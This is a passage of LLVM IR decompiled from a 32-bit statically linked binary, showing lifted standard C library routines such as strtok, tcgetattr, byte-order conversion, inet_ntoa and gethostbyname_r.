  %v5_804f4c7 = and i32 %v4_804f4c76, -256
  %v6_804f4c7 = or i32 %v3_804f4c7, %v5_804f4c7
  %v4_804f4c9 = icmp eq i8 %v2_804f4c7, 0
  %v1_804f4cb = icmp eq i1 %v4_804f4c9, false
  br i1 %v1_804f4cb, label %dec_label_pc_804f4d1, label %dec_label_pc_804f501

dec_label_pc_804f4f5:                             ; preds = %dec_label_pc_804f4db
  %v4_804f4f5 = icmp eq i8 %v2_804f4d1, 0
  br i1 %v4_804f4f5, label %dec_label_pc_804f4ff, label %dec_label_pc_804f4fc

dec_label_pc_804f4fc:                             ; preds = %dec_label_pc_804f4f5
  %v1_804f4fc = add i32 %v0_804f4fc37, 1
  %v2_804f4c719 = load i8, i8* %v1_804f4c718, align 1
  %v3_804f4c720 = zext i8 %v2_804f4c719 to i32
  %v5_804f4c721 = and i32 %v6_804f4e7, 65280
  %v6_804f4c722 = or i32 %v3_804f4c720, %v5_804f4c721
  %v4_804f4c923 = icmp eq i8 %v2_804f4c719, 0
  %v1_804f4cb24 = icmp eq i1 %v4_804f4c923, false
  br i1 %v1_804f4cb24, label %dec_label_pc_804f4d1.lr.ph, label %dec_label_pc_804f501

dec_label_pc_804f4ff:                             ; preds = %dec_label_pc_804f4f5
  br label %dec_label_pc_804f501

dec_label_pc_804f501:                             ; preds = %dec_label_pc_804f4fc, %entry, %dec_label_pc_804f4f1, %dec_label_pc_804f4ff
  %storemerge = phi i32 [ 0, %dec_label_pc_804f4ff ], [ %v4_804f4bb, %entry ], [ %v1_804f4fc, %dec_label_pc_804f4fc ], [ %v0_804f4fc37, %dec_label_pc_804f4f1 ]
  store i32 %v0_804f4b7, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_804f4c719, { 1, 2, 0 }
  uselistorder i8 %v2_804f4c7, { 1, 2, 0 }
  uselistorder i8* %v1_804f4c7, { 1, 0 }
  uselistorder i32 %v0_804f4de, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804f4f225, { 1, 0 }
  uselistorder i8 %v2_804f4c71931, { 0, 2, 1 }
  uselistorder i8* %v1_804f4c718, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f501, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_804f4d1, { 1, 0 }
  uselistorder label %dec_label_pc_804f4d1.lr.ph, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_804f518 = inttoptr i32 %arg1 to i8*
  %v4_804f518 = call i32 @strtok_r(i8* %v3_804f518, i32 %arg2, i32 ptrtoint (i32* @global_var_80601a0.216 to i32))
  ret i32 %v4_804f518
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %v3_804f530 = call i32 @__GI_tcgetattr(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_804f535 = icmp eq i32 %v3_804f530, 0
  %v1_804f537 = zext i1 %v1_804f535 to i32
  ret i32 %v1_804f537
}

define i32 @__GI_tcgetattr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_3()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f544 = load i32, i32* @esi, align 4
  %v0_804f545 = load i32, i32* @ebx, align 4
  store i32 %v0_804f545, i32* %stack_var_-8, align 4
  %v2_804f549 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804f549, i32* %eax.global-to-local, align 4
  store i32 %tmp8, i32* @ebx, align 4
  %v3_804f55b = call i32 @ioctl(i32 %arg1, i32 21505, i32 %v2_804f549)
  store i32 %v3_804f55b, i32* %eax.global-to-local, align 4
  store i32 %v3_804f55b, i32* @esi, align 4
  %v1_804f565 = icmp eq i32 %v3_804f55b, 0
  %v1_804f567 = icmp eq i1 %v1_804f565, false
  br i1 %v1_804f567, label %dec_label_pc_804f5ac, label %dec_label_pc_804f569

dec_label_pc_804f569:                             ; preds = %entry
  %v3_804f569 = load i32, i32* %stack_var_-44, align 4
  %v1_804f56d = load i32, i32* @ebx, align 4
  %v2_804f56d = inttoptr i32 %v1_804f56d to i32*
  store i32 %v3_804f569, i32* %v2_804f56d, align 4
  %v1_804f573 = load i32, i32* @ebx, align 4
  %v2_804f573 = add i32 %v1_804f573, 4
  %v3_804f573 = inttoptr i32 %v2_804f573 to i32*
  %v1_804f57a = load i32, i32* @ebx, align 4
  %v2_804f57a = add i32 %v1_804f57a, 8
  %v3_804f57a = inttoptr i32 %v2_804f57a to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_804f581 = load i32, i32* @ebx, align 4
  %v2_804f581 = add i32 %v1_804f581, 12
  %v3_804f581 = inttoptr i32 %v2_804f581 to i32*
  store i32 %tmp3, i32* %v3_804f581, align 4
  %v4_804f584 = zext i8 %tmp to i32
  %v5_804f584 = load i32, i32* %eax.global-to-local, align 4
  %v6_804f584 = and i32 %v5_804f584, -256
  %v7_804f584 = or i32 %v6_804f584, %v4_804f584
  store i32 %v7_804f584, i32* %eax.global-to-local, align 4
  %v2_804f588 = load i32, i32* @ebx, align 4
  %v3_804f588 = add i32 %v2_804f588, 16
  %v4_804f588 = inttoptr i32 %v3_804f588 to i8*
  store i8 %tmp, i8* %v4_804f588, align 1
  %v0_804f58b = load i32, i32* %eax.global-to-local, align 4
  %v2_804f58e = ptrtoint i32* %stack_var_-27 to i32
  %v0_804f593 = load i32, i32* @ebx, align 4
  %v1_804f593 = add i32 %v0_804f593, 17
  store i32 %v1_804f593, i32* %eax.global-to-local, align 4
  %v4_804f597 = call i32 @__GI_mempcpy(i32 %v1_804f593, i32 %v2_804f58e, i32 19, i32 %v0_804f58b)
  store i32 %v4_804f597, i32* %eax.global-to-local, align 4
  %v3_804f5a4 = inttoptr i32 %v4_804f597 to i8*
  %v4_804f5a4 = call i32 @__GI_memset(i8* %v3_804f5a4, i32 0, i32 13)
  store i32 %v4_804f5a4, i32* %eax.global-to-local, align 4
  %v0_804f5ac.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f5ac

dec_label_pc_804f5ac:                             ; preds = %entry, %dec_label_pc_804f569
  %v0_804f5ac = phi i32 [ %v3_804f55b, %entry ], [ %v0_804f5ac.pre, %dec_label_pc_804f569 ]
  store i32 %v0_804f5ac, i32* %eax.global-to-local, align 4
  %v2_804f5b1 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f5b1, i32* @ebx, align 4
  store i32 %v0_804f544, i32* @esi, align 4
  ret i32 %v0_804f5ac

; uselistorder directives
  uselistorder i32 %v0_804f5ac, { 1, 0 }
  uselistorder i32 %v3_804f55b, { 0, 2, 1, 3 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f5ac, { 1, 0 }
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804f5b8 = trunc i32 %arg1 to i16
  %v2_804f5b8 = call i16 @llvm.bswap.i16(i16 %v1_804f5b8)
  %v3_804f5b8 = zext i16 %v2_804f5b8 to i32
  ret i32 %v3_804f5b8
}

define i32 @htonl() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v1_804f5c4 = call i32 @llvm.bswap.i32(i32 %tmp)
  ret i32 %v1_804f5c4
}

define i32 @ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804f5cb = trunc i32 %arg1 to i16
  %v2_804f5cb = call i16 @llvm.bswap.i16(i16 %v1_804f5cb)
  %v3_804f5cb = zext i16 %v2_804f5cb to i32
  ret i32 %v3_804f5cb
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804f5d7 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_804f5d7
}

define i32 @__GI_inet_ntoa_r(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804f5dc = load i32, i32* @edi, align 4
  %v0_804f5dd = load i32, i32* @esi, align 4
  %v0_804f5de = load i32, i32* @ebx, align 4
  store i32 %v0_804f5de, i32* %stack_var_-12, align 4
  store i32 0, i32* @edi, align 4
  %v1_804f5e9 = add i32 %arg2, 15
  store i32 %v1_804f5e9, i32* %ecx.global-to-local, align 4
  store i32 0, i32* @esi, align 4
  %v1_804f5ee = call i32 @llvm.bswap.i32(i32 %arg1)
  %sext = mul i32 %v1_804f5ee, 16777216
  %v1_804f5f0 = sdiv i32 %sext, 16777216
  store i32 %v1_804f5f0, i32* @ebx, align 4
  br label %dec_label_pc_804f5f4

dec_label_pc_804f5f4:                             ; preds = %entry, %dec_label_pc_804f619
  %v0_804f5f717 = phi i32 [ %v1_804f5f0, %entry ], [ %v2_804f619, %dec_label_pc_804f619 ]
  %v0_804f62416 = phi i32 [ %v1_804f5e9, %entry ], [ %v0_804f61d, %dec_label_pc_804f619 ]
  %v1_804f5f9 = urem i32 %v0_804f5f717, 256
  %v5_804f607 = inttoptr i32 %v0_804f62416 to i8*
  %v6_804f607 = call i32 @_uintmaxtostr(i8* %v5_804f607, i32 %v1_804f5f9, i32 0, i32 -10, i32 0)
  %v0_804f60f = load i32, i32* @esi, align 4
  %v1_804f60f = icmp eq i32 %v0_804f60f, 0
  %v1_804f611 = add i32 %v6_804f607, -1
  store i32 %v1_804f611, i32* %ecx.global-to-local, align 4
  br i1 %v1_804f60f, label %dec_label_pc_804f619, label %dec_label_pc_804f616

dec_label_pc_804f616:                             ; preds = %dec_label_pc_804f5f4
  %v1_804f616 = inttoptr i32 %v0_804f60f to i8*
  store i8 46, i8* %v1_804f616, align 1
  %v0_804f61d.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f619

dec_label_pc_804f619:                             ; preds = %dec_label_pc_804f5f4, %dec_label_pc_804f616
  %v0_804f61d = phi i32 [ %v1_804f611, %dec_label_pc_804f5f4 ], [ %v0_804f61d.pre, %dec_label_pc_804f616 ]
  %v0_804f619 = load i32, i32* @ebx, align 4
  %v2_804f619 = udiv i32 %v0_804f619, 256
  store i32 %v2_804f619, i32* @ebx, align 4
  %v0_804f61c = load i32, i32* @edi, align 4
  %v1_804f61c = add i32 %v0_804f61c, 1
  store i32 %v1_804f61c, i32* @edi, align 4
  store i32 %v0_804f61d, i32* @esi, align 4
  %v7_804f622 = icmp sgt i32 %v1_804f61c, 3
  br i1 %v7_804f622, label %dec_label_pc_804f624, label %dec_label_pc_804f5f4

dec_label_pc_804f624:                             ; preds = %dec_label_pc_804f619
  %v1_804f624 = add i32 %v0_804f61d, 1
  %v2_804f627 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f627, i32* @ebx, align 4
  store i32 %v0_804f5dd, i32* @esi, align 4
  store i32 %v0_804f5dc, i32* @edi, align 4
  ret i32 %v1_804f624

; uselistorder directives
  uselistorder i32 %v0_804f61d, { 0, 2, 1 }
  uselistorder i32 %v1_804f5f0, { 1, 0 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f619, { 1, 0 }
  uselistorder label %dec_label_pc_804f5f4, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  %v2_804f637 = call i32 @__GI_inet_ntoa_r(i32 %arg1, i32 ptrtoint (i32* @global_var_80601a4.217 to i32))
  ret i32 %v2_804f637
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v2_804f643 = ptrtoint i32* %stack_var_-4 to i32
  %v2_804f64c = inttoptr i32 %arg1 to i8*
  %v3_804f64c = call i32 @inet_aton(i8* %v2_804f64c, i32 %v2_804f643)
  %v1_804f657 = icmp eq i32 %v3_804f64c, 0
  br i1 %v1_804f657, label %dec_label_pc_804f65f, label %dec_label_pc_804f65b

dec_label_pc_804f65b:                             ; preds = %entry
  %v3_804f65b = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804f65f

dec_label_pc_804f65f:                             ; preds = %entry, %dec_label_pc_804f65b
  %v0_804f65f = phi i32 [ -1, %entry ], [ %v3_804f65b, %dec_label_pc_804f65b ]
  ret i32 %v0_804f65f

; uselistorder directives
  uselistorder label %dec_label_pc_804f65f, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804f66b = call i32 @__GI___h_errno_location()
  %v0_804f670 = load i32, i32* @edx, align 4
  %v2_804f673 = ptrtoint i32* %stack_var_-4 to i32
  %v9_804f68b = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_806038c.219, i32 ptrtoint (i32* @global_var_80601c0.218 to i32), i32 460, i32 %v2_804f673, i32 %v0_804f66b, i32 %v0_804f670, i32 %v0_804f670)
  %v3_804f690 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_804f690
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %v0_804f698 = load i32, i32* @ebp, align 4
  %v0_804f699 = load i32, i32* @edi, align 4
  %v0_804f69a = load i32, i32* @esi, align 4
  %v0_804f69b = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v1_804f6ab = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v1_804f6ab, align 4
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_804f6b6 = icmp eq i32 %arg1, 0
  br i1 %v4_804f6b6, label %dec_label_pc_804f9c2, label %dec_label_pc_804f6c1

dec_label_pc_804f6c1:                             ; preds = %entry
  %v1_804f6c1 = call i32 @__errno_location(i32 %v0_804f69b)
  store i32 %v1_804f6c1, i32* %eax.global-to-local, align 4
  store i32 %v1_804f6c1, i32* @esi, align 4
  %v1_804f6c8 = inttoptr i32 %v1_804f6c1 to i32*
  %v2_804f6c8 = load i32, i32* %v1_804f6c8, align 4
  store i32 %v2_804f6c8, i32* @edi, align 4
  store i32 0, i32* %v1_804f6c8, align 4
  %v0_804f6d9 = load i32, i32* @ebx, align 4
  store i32 %v0_804f6d9, i32* %stack_var_-108, align 4
  %v7_804f6e5 = call i32 @__get_hosts_byname_r(i32 %arg1, i32 2, i32 %tmp18, i32 %v0_804f6d9, i32 %arg5, i32 %arg6, i32 %v1_804f6c1)
  store i32 %v7_804f6e5, i32* %eax.global-to-local, align 4
  %v1_804f6ed = icmp eq i32 %v7_804f6e5, 0
  br i1 %v1_804f6ed, label %dec_label_pc_804f9c2, label %dec_label_pc_804f6f5

dec_label_pc_804f6f5:                             ; preds = %dec_label_pc_804f6c1
  %v1_804f6f9 = inttoptr i32 %arg6 to i32*
  %v2_804f6f9 = load i32, i32* %v1_804f6f9, align 4
  store i32 %v2_804f6f9, i32* %edx.global-to-local, align 4
  %v9_804f6fb = icmp eq i32 %v2_804f6f9, 1
  br i1 %v9_804f6fb, label %dec_label_pc_804f715, label %dec_label_pc_804f700

dec_label_pc_804f700:                             ; preds = %dec_label_pc_804f6f5
  %v9_804f700 = icmp eq i32 %v2_804f6f9, 4
  br i1 %v9_804f700, label %dec_label_pc_804f715, label %dec_label_pc_804f705

dec_label_pc_804f705:                             ; preds = %dec_label_pc_804f700
  %v1_804f705 = add i32 %v2_804f6f9, 1
  %v8_804f705 = icmp eq i32 %v1_804f705, 0
  store i32 %v1_804f705, i32* %edx.global-to-local, align 4
  %v1_804f706 = icmp eq i1 %v8_804f705, false
  br i1 %v1_804f706, label %dec_label_pc_804f9c2, label %dec_label_pc_804f70c

dec_label_pc_804f70c:                             ; preds = %dec_label_pc_804f705
  %v0_804f70c = load i32, i32* @esi, align 4
  %v1_804f70c = inttoptr i32 %v0_804f70c to i32*
  %v2_804f70c = load i32, i32* %v1_804f70c, align 4
  %v11_804f70c = icmp eq i32 %v2_804f70c, 2
  %v1_804f70f = icmp eq i1 %v11_804f70c, false
  br i1 %v1_804f70f, label %dec_label_pc_804f9c2, label %dec_label_pc_804f715

dec_label_pc_804f715:                             ; preds = %dec_label_pc_804f70c, %dec_label_pc_804f700, %dec_label_pc_804f6f5
  %v0_804f715 = load i32, i32* @ebp, align 4
  store i32 %v0_804f715, i32* %eax.global-to-local, align 4
  %v0_804f717 = load i32, i32* @edi, align 4
  %v1_804f717 = load i32, i32* @esi, align 4
  %v2_804f717 = inttoptr i32 %v1_804f717 to i32*
  store i32 %v0_804f717, i32* %v2_804f717, align 4
  %v0_804f719 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f719 = sub i32 0, %v0_804f719
  %v1_804f71b = urem i32 %v1_804f719, 4
  %v2_804f71b = icmp eq i32 %v1_804f71b, 0
  store i32 %v1_804f71b, i32* %eax.global-to-local, align 4
  %v0_804f730.pre = load i32, i32* @ebx, align 4
  br i1 %v2_804f71b, label %dec_label_pc_804f72c, label %dec_label_pc_804f720

dec_label_pc_804f720:                             ; preds = %dec_label_pc_804f715
  %v2_804f720 = sub i32 %v0_804f730.pre, %v1_804f71b
  %v7_804f720 = icmp ult i32 %v0_804f730.pre, %v1_804f71b
  br i1 %v7_804f720, label %dec_label_pc_804f9bd, label %dec_label_pc_804f728

dec_label_pc_804f728:                             ; preds = %dec_label_pc_804f720
  %v0_804f728 = load i32, i32* @ebp, align 4
  %v2_804f728 = add i32 %v0_804f728, %v1_804f71b
  store i32 %v2_804f728, i32* @ebp, align 4
  store i32 %v2_804f720, i32* @ebx, align 4
  br label %dec_label_pc_804f72c

dec_label_pc_804f72c:                             ; preds = %dec_label_pc_804f715, %dec_label_pc_804f728
  %v0_804f730 = phi i32 [ %v2_804f720, %dec_label_pc_804f728 ], [ %v0_804f730.pre, %dec_label_pc_804f715 ]
  store i32 %arg6, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %v1_804f6f9, align 4
  %tmp43 = icmp ult i32 %v0_804f730, 4
  br i1 %tmp43, label %dec_label_pc_804f9bd, label %dec_label_pc_804f73f

dec_label_pc_804f73f:                             ; preds = %dec_label_pc_804f72c
  %v0_804f73f = load i32, i32* @ebx, align 4
  %v1_804f73f = add i32 %v0_804f73f, -4
  store i32 %v1_804f73f, i32* %eax.global-to-local, align 4
  %tmp44 = icmp ult i32 %v1_804f73f, 8
  br i1 %tmp44, label %dec_label_pc_804f9bd, label %dec_label_pc_804f74b

dec_label_pc_804f74b:                             ; preds = %dec_label_pc_804f73f
  %v0_804f74b = load i32, i32* @ebp, align 4
  %v1_804f74b = add i32 %v0_804f74b, 4
  store i32 %v1_804f74b, i32* %edx.global-to-local, align 4
  %v1_804f74e = add i32 %v0_804f73f, -12
  store i32 %v1_804f74e, i32* %eax.global-to-local, align 4
  store i32 %v1_804f74b, i32* %stack_var_-92, align 4
  %v3_804f757 = inttoptr i32 %v1_804f74b to i32*
  store i32 %v0_804f74b, i32* %v3_804f757, align 4
  %v0_804f75a = load i32, i32* %edx.global-to-local, align 4
  %v1_804f75a = add i32 %v0_804f75a, 4
  %v2_804f75a = inttoptr i32 %v1_804f75a to i32*
  store i32 0, i32* %v2_804f75a, align 4
  %tmp45 = icmp ult i32 %v1_804f74e, 32
  br i1 %tmp45, label %dec_label_pc_804f9bd, label %dec_label_pc_804f767

dec_label_pc_804f767:                             ; preds = %dec_label_pc_804f74b
  %v0_804f767 = load i32, i32* @ebx, align 4
  %v1_804f767 = add i32 %v0_804f767, -44
  store i32 %v1_804f767, i32* @ebx, align 4
  %tmp46 = icmp ult i32 %v1_804f767, 256
  br i1 %tmp46, label %dec_label_pc_804f9bd, label %dec_label_pc_804f77a

dec_label_pc_804f77a:                             ; preds = %dec_label_pc_804f767
  %v0_804f77a = load i32, i32* @ebp, align 4
  %v1_804f77a = add i32 %v0_804f77a, 12
  %v1_804f77d = add i32 %v0_804f77a, 44
  store i32 %v1_804f77d, i32* @edi, align 4
  store i32 %v1_804f77d, i32* %stack_var_-108, align 4
  %v3_804f78e = inttoptr i32 %v1_804f77d to i8*
  %v4_804f78e = call i32 @strncpy(i8* %v3_804f78e, i32 %arg1, i32 %v1_804f767)
  %v0_804f793 = load i32, i32* @edi, align 4
  %v1_804f793 = load i32, i32* @ebp, align 4
  %v2_804f793 = add i32 %v1_804f793, 12
  %v3_804f793 = inttoptr i32 %v2_804f793 to i32*
  store i32 %v0_804f793, i32* %v3_804f793, align 4
  %v1_804f79a = add i32 %v0_804f77a, 16
  %v2_804f79a = inttoptr i32 %v1_804f79a to i32*
  store i32 0, i32* %v2_804f79a, align 4
  %v2_804f7a1 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_804f7a1, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v0_804f7a3 = load i32, i32* @ebp, align 4
  store i32 %arg1, i32* %stack_var_-108, align 4
  %v2_804f7a8 = inttoptr i32 %arg1 to i8*
  %v3_804f7a8 = call i32 @inet_aton(i8* %v2_804f7a8, i32 %v0_804f7a3)
  store i32 %v3_804f7a8, i32* %eax.global-to-local, align 4
  %v1_804f7b0 = icmp eq i32 %v3_804f7a8, 0
  br i1 %v1_804f7b0, label %dec_label_pc_804f7ec, label %dec_label_pc_804f7b4

dec_label_pc_804f7b4:                             ; preds = %dec_label_pc_804f77a
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  %v0_804f7b8 = load i32, i32* @edi, align 4
  store i32 %v0_804f7b8, i32* %arg2, align 4
  %v1_804f7ba = add i32 %tmp18, 8
  %v2_804f7ba = inttoptr i32 %v1_804f7ba to i32*
  store i32 2, i32* %v2_804f7ba, align 4
  %v0_804f7c1 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f7c1 = add i32 %v0_804f7c1, 12
  %v2_804f7c1 = inttoptr i32 %v1_804f7c1 to i32*
  store i32 4, i32* %v2_804f7c1, align 4
  %v2_804f7c8 = load i32, i32* %stack_var_-92, align 4
  %v1_804f7cb = load i32, i32* %edx.global-to-local, align 4
  %v2_804f7cb = add i32 %v1_804f7cb, 16
  %v3_804f7cb = inttoptr i32 %v2_804f7cb to i32*
  store i32 %v2_804f7c8, i32* %v3_804f7cb, align 4
  %v1_804f7d2 = load i32, i32* %edx.global-to-local, align 4
  %v2_804f7d2 = add i32 %v1_804f7d2, 4
  %v3_804f7d2 = inttoptr i32 %v2_804f7d2 to i32*
  store i32 %v1_804f77a, i32* %v3_804f7d2, align 4
  %v0_804f7d9 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804f7d9, i32* %v1_804f6ab, align 4
  store i32 0, i32* %v1_804f6f9, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f9c2

dec_label_pc_804f7ec:                             ; preds = %dec_label_pc_804f77a
  %v0_804f7ec = call i32 @__open_nameservers()
  store i32 %v0_804f7ec, i32* @eax, align 4
  %v2_804f7fc = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_804f7fc, i32* @ebx, align 4
  store i32 %v2_804f7fc, i32* %stack_var_-108, align 4
  %v2_804f801 = call i32 @__pthread_return_void(i32 %v2_804f7fc, i32 134550911)
  store i32 %v2_804f801, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805a128.220 to i32), i32* %stack_var_-108, align 4
  %v1_804f80d = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805a128.220 to i32))
  store i32 ptrtoint (i32* @global_var_805a128.220 to i32), i32* @ecx, align 4
  store i32 134550911, i32* @eax, align 4
  store i32 %v2_804f7fc, i32* %stack_var_-108, align 4
  %v0_804f817 = load i32, i32* @global_var_8060814.221, align 4
  store i32 %v0_804f817, i32* @esi, align 4
  %v2_804f81d = call i32 @__pthread_return_void(i32 %v2_804f7fc, i32 1)
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_804f838 = ptrtoint i32* %stack_var_-76 to i32
  %v2_804f83d = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804f83d, i32* %eax.global-to-local, align 4
  store i32 %v2_804f83d, i32* %stack_var_-108, align 4
  %v0_804f847 = load i32, i32* @esi, align 4
  %v7_804f84e = call i32 @__dns_lookup(i8* %v2_804f7a8, i32 1, i32 %v0_804f847, i32 ptrtoint (i32* @global_var_8060808.222 to i32), i32 %v2_804f83d, i32 %v2_804f838)
  store i32 %v7_804f84e, i32* %eax.global-to-local, align 4
  %v2_804f856 = icmp slt i32 %v7_804f84e, 0
  %v1_804f858 = icmp eq i1 %v2_804f856, false
  br i1 %v1_804f858, label %dec_label_pc_804f86e, label %dec_label_pc_804f85a

dec_label_pc_804f85a:                             ; preds = %dec_label_pc_804f7ec
  store i32 2, i32* %eax.global-to-local, align 4
  store i32 1, i32* %v1_804f6f9, align 4
  br label %dec_label_pc_804f9c2

dec_label_pc_804f86e:                             ; preds = %dec_label_pc_804f7ec
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v10_804f881 = icmp ugt i32 %v1_804f767, 256
  %v15_804f881 = icmp eq i32 %v0_804f767, 300
  %v2_804f885 = or i1 %v15_804f881, %v10_804f881
  br i1 %v2_804f885, label %dec_label_pc_804f920, label %dec_label_pc_804f887

dec_label_pc_804f887:                             ; preds = %dec_label_pc_804f86e
  %v3_804f88a = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_804f88a, i32* %stack_var_-108, align 4
  %v1_804f88e = call i32 @free(i32 %v3_804f88a)
  store i32 %v1_804f88e, i32* %eax.global-to-local, align 4
  store i32 %v3_804f88a, i32* @edi, align 4
  %v3_804f894 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804f894, i32* %stack_var_-108, align 4
  %v1_804f898 = call i32 @free(i32 %v3_804f894)
  store i32 -1, i32* %v1_804f6f9, align 4
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f998

dec_label_pc_804f920:                             ; preds = %dec_label_pc_804f86e
  %v3_804f925.pre = load i32, i32* %stack_var_-76, align 4
  %v0_804f929.pre = load i32, i32* @edi, align 4
  store i32 %v0_804f929.pre, i32* %stack_var_-108, align 4
  %v3_804f92a = inttoptr i32 %v0_804f929.pre to i8*
  %v4_804f92a = call i32 @strncpy(i8* %v3_804f92a, i32 %v3_804f925.pre, i32 %v1_804f767)
  store i32 %v4_804f92a, i32* %eax.global-to-local, align 4
  %v3_804f930 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_804f930, i32* %stack_var_-108, align 4
  %v1_804f934 = call i32 @free(i32 %v3_804f930)
  store i32 %v1_804f934, i32* %eax.global-to-local, align 4
  %v12_804f93c = icmp eq i32 %tmp10, 1
  %v1_804f941 = icmp eq i1 %v12_804f93c, false
  br i1 %v1_804f941, label %dec_label_pc_804f99d, label %dec_label_pc_804f943

dec_label_pc_804f943:                             ; preds = %dec_label_pc_804f920
  %v0_804f943 = load i32, i32* @edx, align 4
  %v0_804f94a = load i32, i32* @ebp, align 4
  store i32 %v0_804f94a, i32* %stack_var_-108, align 4
  %v3_804f94b = inttoptr i32 %tmp to i16*
  %v4_804f94b = call i32 @memcpy(i16* %v3_804f94b, i32 4, i32 %v0_804f943)
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v0_804f954 = load i32, i32* @edi, align 4
  store i32 %v0_804f954, i32* %arg2, align 4
  %v1_804f956 = add i32 %tmp18, 8
  %v2_804f956 = inttoptr i32 %v1_804f956 to i32*
  store i32 2, i32* %v2_804f956, align 4
  %v0_804f95d = load i32, i32* %eax.global-to-local, align 4
  %v1_804f95d = add i32 %v0_804f95d, 12
  %v2_804f95d = inttoptr i32 %v1_804f95d to i32*
  store i32 4, i32* %v2_804f95d, align 4
  %v3_804f964 = load i32, i32* %stack_var_-92, align 4
  store i32 %v3_804f964, i32* %edx.global-to-local, align 4
  %v1_804f968 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f968 = add i32 %v1_804f968, 16
  %v3_804f968 = inttoptr i32 %v2_804f968 to i32*
  store i32 %v3_804f964, i32* %v3_804f968, align 4
  %v1_804f96f = load i32, i32* %eax.global-to-local, align 4
  %v2_804f96f = add i32 %v1_804f96f, 4
  %v3_804f96f = inttoptr i32 %v2_804f96f to i32*
  store i32 %v1_804f77a, i32* %v3_804f96f, align 4
  %v2_804f972 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_804f972, i32* %eax.global-to-local, align 4
  %v3_804f973 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804f973, i32* %stack_var_-108, align 4
  %v1_804f977 = call i32 @free(i32 %v3_804f973)
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  store i32 %tmp18, i32* %v1_804f6ab, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804f6f9, align 4
  br label %dec_label_pc_804f998

